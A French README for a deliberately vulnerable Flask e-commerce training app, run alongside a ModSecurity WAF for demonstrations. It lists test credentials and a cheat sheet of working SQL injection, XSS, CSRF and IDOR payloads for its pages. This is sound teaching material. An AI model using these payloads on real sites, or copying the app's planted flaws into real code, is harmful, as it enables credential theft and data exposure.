# TechMart — Application E-commerce Vulnérable

> ⚠️ **USAGE PÉDAGOGIQUE UNIQUEMENT** — Ne pas déployer en production.

Application Flask e-commerce volontairement vulnérable pour démonstration de sécurité web.

---

## 🚀 Démarrage rapide

```bash
# Cloner / extraire le projet
cd techmart

# Lancer les 2 services (app + WAF)
docker-compose up -d

# Accès AVANT WAF (vulnérable)
http://localhost:5000

# Accès APRÈS WAF (ModSecurity)
http://localhost:8080
```

---

## 🔧 Architecture

```
docker-compose.yml
├── techmart_app  (port 5000) — Flask Python direct
└── techmart_waf  (port 8080) — ModSecurity OWASP CRS devant Flask
```

---

## 👥 Comptes de test

| Utilisateur | Mot de passe | Rôle  |
|-------------|-------------|-------|
| admin       | Admin@1234  | admin |
| alice       | alice123    | user  |
| bob         | bob456      | user  |
| charlie     | charlie789  | user  |

---

## 🎯 Vulnérabilités & Payloads

### 1. SQLi Bypass — `/login`
```
Username : admin' --
Username : ' OR '1'='1' --
```

### 2. SQLi UNION — `/search`
```
%' UNION SELECT 1,label,value,4,5,6,7,8,9,10,11,12,13 FROM secret_data --
%' UNION SELECT 1,username,password,4,5,6,7,8,9,10,11,12,13 FROM users --
```

### 3. SQLi Coupon — `/cart`
```
PROMO10' OR 1=1 --   → active ADMIN50 (-50%)
```

### 4. XSS Réfléchi — `/search?q=`
```
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
```

### 5. XSS Stocké — `/product/{id}` (avis)
```
<script>alert('XSS Stocké ! Cookie='+document.cookie)</script>
<img src=x onerror=alert(document.cookie)>
```

### 6. XSS DOM — `/category/{id}?sort=` et `/profile?tab=`
```
/category/1?sort=<img src=x onerror=alert(1)>
/profile?tab=<img src=x onerror=alert(1)>
```

### 7. CSRF — Formulaires sans token
Aucun token CSRF sur `/cart/add`, `/checkout`, `/profile`.

### 8. IDOR — `/orders/{id}`
Accéder à `/orders/1` avec le compte bob → voit la commande d'alice.

### 9. Auth — Mots de passe en clair
Visibles dans `/admin/users` après SQLi Bypass.

---

## 🛡️ Activer le blocage WAF

Dans `docker-compose.yml`, changer :
```yaml
MODSECURITY_SEC_RULE_ENGINE: "On"   # était "DetectionOnly"
```
Puis : `docker-compose restart techmart_waf`

---

## 📁 Structure

```
techmart/
├── app/
│   ├── app.py                  # Application Flask (vulnérable)
│   └── templates/
│       ├── base.html           # Design system complet
│       ├── home.html           # Page d'accueil + cheatsheet vulns
│       ├── product.html        # Fiche produit (XSS Stocké)
│       ├── search.html         # Recherche (SQLi UNION + XSS Réfléchi)
│       ├── category.html       # Catégorie (XSS DOM)
│       ├── cart.html           # Panier (SQLi Coupon + CSRF)
│       ├── checkout.html       # Commande (CSRF)
│       ├── orders.html         # Liste commandes (IDOR)
│       ├── order_detail.html   # Détail commande (IDOR)
│       ├── login.html          # Connexion (SQLi Bypass)
│       ├── register.html       # Inscription (plain-text)
│       ├── profile.html        # Profil (XSS DOM + CSRF)
│       └── admin/              # Panel admin
│           ├── dashboard.html
│           ├── products.html
│           ├── orders.html
│           └── users.html      # Mots de passe en clair !
├── waf/
│   └── nginx.conf              # Config Nginx + ModSecurity
├── Dockerfile
├── docker-compose.yml
└── PAYLOADS.txt                # Cheatsheet complète
```
